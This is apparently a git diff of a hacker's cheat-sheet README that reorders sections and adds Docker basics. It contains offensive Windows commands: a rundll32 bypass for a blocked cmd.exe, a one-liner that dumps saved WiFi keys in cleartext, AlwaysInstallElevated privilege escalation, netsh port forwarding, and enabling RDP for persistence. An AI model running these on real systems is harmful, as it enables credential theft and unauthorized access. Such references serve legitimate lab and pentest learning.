@@ -20,8 +20,6 @@ Looking for a rabbit hole? Start here:
 - 📡 **[WiFi](sections/wifi.md)**
 - 🐍 **[Python3 one liners and scripts](sections/Python_One_Liners_and_scripts.md)**
 
-![Available Commands](/images/002_available_commands.png)
-
 ---
 
 ## 🧑‍💻 Linux Users, Assemble
@@ -39,6 +37,53 @@ sudo deluser --remove-all-files <username>
 
 ## 🪟 Windows Shenanigans
 
+### 🫢📜 Blocked CMD Bypass — When `cmd.exe` is banned but you still have ideas.
+
+
+- create a batch file and run it with: `rundll32.exe shell32.dll, ShellExec_RunDLL C:\Windows\Users\<username>\Desktop\command.bat`
+- output for the command will be written to output.txt
+- can tweak it to your liking, including cmd= and enter
+- great resource **[here](https://lolbas-project.github.io/lolbas/Libraries/Shell32/)**
+
+```
+@echo off
+:Loop
+echo %cd%^>
+set /p cmd=Type your command here
+%cmd% >> c:\users\<username>\desktop\output.t>
+Goto Loop
+```
+Another stealthier example
+```
+@echo off
+
+set cmd=dir
+%cmd% >> c:\users\<username>\desktop\output.t>
+
+```
+### 💾📁 dir (Win) — Because Windows still loves listing files like it's 1995.
+
+Searching in ***Windows*** using the `dir` co>
+
+- `dir *.txt *.doc` to list any file whose na>
+- `dir /a:d` to list only directories
+- `dir /a:r` to list only files with the read>
+- `dir /s` to list files and directories in t>
+- `dir /p` to pause after each screenful of o>
+- `dir /w` to list multiple file names on eve>
+- `dir /s /w /p` to recursively lists all fil>
+- `dir /s /w /p "C:\Program Files"` same as t>
+- `dir /s /q /a:sh /p C:\Windows` Lists any f>
+- `dir \ /s | find "i" | more` the above comm>
+- `dir /s /a:hs /q C:\Windows > myfile.txt` r>
+
+---
+
+### 📶🔓 WiFi Passwords in Cleartext (Win) — Because Windows whispers secrets if you ask nicely.
+
+- `netsh show profile "wifi network name" key=clear` 
+- Also we can save the above info into a file: `for /f "skip=9 tokens=1,2 delims=:"  %i in ('netsh wlan show profiles') do @if "%j" NEQ "" (echo SSID: %j & netsh wlan show profiles %j key=clear | findstr "Key Content") >> wifipassword.txt`
+
 ### 🔼 AlwaysInstallElevated — because Microsoft said, "why not?"
 
 ```
@@ -46,6 +91,21 @@ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
 msiexec /i "C:\xampp\htdocs\shenzi\notavirus.msi"
 ```
+
+### 🔌🪟 netsh / Windows — Port forwarding, the Windows way (i.e., slightly painful).
+
+- add a firewall rule and IPHelper has to be enabled
+- `netsh interface portproxy add v4tov4 listenport=4455 listenaddress=10.11.0.11 connectport=445 connectaddress=192.168.10.1`
+- `netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=<local IP> localport=4455 action=allow`
+- verify: `netstat -anp TCP | find "4455"`
+
+---
+
+### 🪟🔁 Persistence via RDP — PowerShell, registry, and remote regrets.
+
+- `powershell reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f; Enable-NetFirewallRule -DisplayGroup "Remote Desktop"`
+- `xfreerdp /u:<username> /p:'<password>' /v:<target IP>`
+- disable it: `powershell reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnection /t REG_DWORD /d 1 /f; Disable-NetFirewallRule -DisplayGroup "Remote Desktop"`
 
 ---
 
@@ -137,29 +197,6 @@ Don't forget to add it to your proxychains.conf
 Also to make sure you are connecting to the right server
 `./chisel client --fingerprint <chisel server>`
 
-Blocked CMD bypass
-
-- create a batch file and run it with: `rundll32.exe shell32.dll, ShellExec_RunDLL C:\Windows\Users\<username>\Desktop\command.bat`
-- output for the command will be written to output.txt
-- can tweak it to your liking, including cmd= and enter
-- great resource **[here](https://lolbas-project.github.io/lolbas/Libraries/Shell32/)**
-
-```
-@echo off
-:Loop
-echo %cd%^>
-set /p cmd=Type your command here
-%cmd% >> c:\users\<username>\desktop\output.t>
-Goto Loop
-```
-Another stealthier example
-```
-@echo off
-
-set cmd=dir
-%cmd% >> c:\users\<username>\desktop\output.t>
-
-```
 ---
 
 ## 🔐🔥 crackmapexec
@@ -182,31 +219,6 @@ You can do some great things with ***curl***,>
 💣🧠 grep + regex = IP extraction magic
 
 - `grep -o ‘[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}’ nmapfile.txt`
-
----
-
-## 💾📁 dir (Win) — Because Windows still loves listing files like it's 1995.
-
-Searching in ***Windows*** using the `dir` co>
-
-- `dir *.txt *.doc` to list any file whose na>
-- `dir /a:d` to list only directories
-- `dir /a:r` to list only files with the read>
-- `dir /s` to list files and directories in t>
-- `dir /p` to pause after each screenful of o>
-- `dir /w` to list multiple file names on eve>
-- `dir /s /w /p` to recursively lists all fil>
-- `dir /s /w /p "C:\Program Files"` same as t>
-- `dir /s /q /a:sh /p C:\Windows` Lists any f>
-- `dir \ /s | find "i" | more` the above comm>
-- `dir /s /a:hs /q C:\Windows > myfile.txt` r>
-
----
-
-## 📶🔓 WiFi Passwords in Cleartext (Win) — Because Windows whispers secrets if you ask nicely.
-
-- `netsh show profile "wifi network name" key=clear` 
-- Also we can save the above info into a file: `for /f "skip=9 tokens=1,2 delims=:"  %i in ('netsh wlan show profiles') do @if "%j" NEQ "" (echo SSID: %j & netsh wlan show profiles %j key=clear | findstr "Key Content") >> wifipassword.txt`
 
 ---
 
@@ -284,23 +296,6 @@ ALTER DATABASE postgres REFRESH COLLATION VERSION;
 
 ---
 
-## 🔌🪟 netsh / Windows — Port forwarding, the Windows way (i.e., slightly painful).
-
-- add a firewall rule and IPHelper has to be enabled
-- `netsh interface portproxy add v4tov4 listenport=4455 listenaddress=10.11.0.11 connectport=445 connectaddress=192.168.10.1`
-- `netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=<local IP> localport=4455 action=allow`
-- verify: `netstat -anp TCP | find "4455"`
-
----
-
-## 🪟🔁 Persistence via RDP — PowerShell, registry, and remote regrets.
-
-- `powershell reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f; Enable-NetFirewallRule -DisplayGroup "Remote Desktop"`
-- `xfreerdp /u:<username> /p:'<password>' /v:<target IP>`
-- disable it: `powershell reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnection /t REG_DWORD /d 1 /f; Disable-NetFirewallRule -DisplayGroup "Remote Desktop"`
-
----
-
 ## 🔄⚡ socat — The Swiss Army knife of TCP wizardry.
 
 - `socat -d -d TCP-LISTEN:1234 -`
@@ -358,7 +353,27 @@ If the target is vulnerable for the get request (see above) we can get a shell o
 
 ## 🧰 Docker, Raspberry Pi, VirtualBox, WireGuard
 
-Whether you’re in a lab, a VM, or a Raspberry Pi taped behind your router, we got you.
+Whether you’re in a lab, a VM, or a Raspberry Pi taped behind your router.
+This section would be too extensive, use the documentation or help menu, but because I'm nice, passing on a few docker-fu commands.
+
+## 🐳⚙️ Docker — Because setting up an OS should only take 3 seconds.
+
+- test if it's working: `docker run hello-world`
+- `docker run --help` - to list all flags this command supports
+- `docker search <TERM>` - to search for a Docker container
+- `docker pull busybox` - to pull down busybox
+- `docker run -it busybox` - to run busybox, the `it` attaches us to an interactive container
+- `docker ps -a` - to check running docker containers and their ID
+- `docker exec -it <container ID> /bin/bash` - to enter a Docker container
+- `docker rm <container ID>` - to remove a docker container
+- `docker rm $(docker ps -a -q -f status=exited)` - if you have a bunch of containers to delete in one go, copy-pasting IDs can be tedious. In that case, you can simply run this command. The `q` flag returns only the numeric IDs and the `f` filters output based on conditions provided.
+- `docker container prune` - in later versions of Docker, this command can be used to remove all stopped containers
+- `docker container ls` - lists all containers
+- `docker image list` - list all pulled images
+- `docker rmi <image ID>` - from the above command get image ID and this command will delete the pulled image
+- `docker network ls` - lists Docker images running on network
+
+```
 
 ---
 
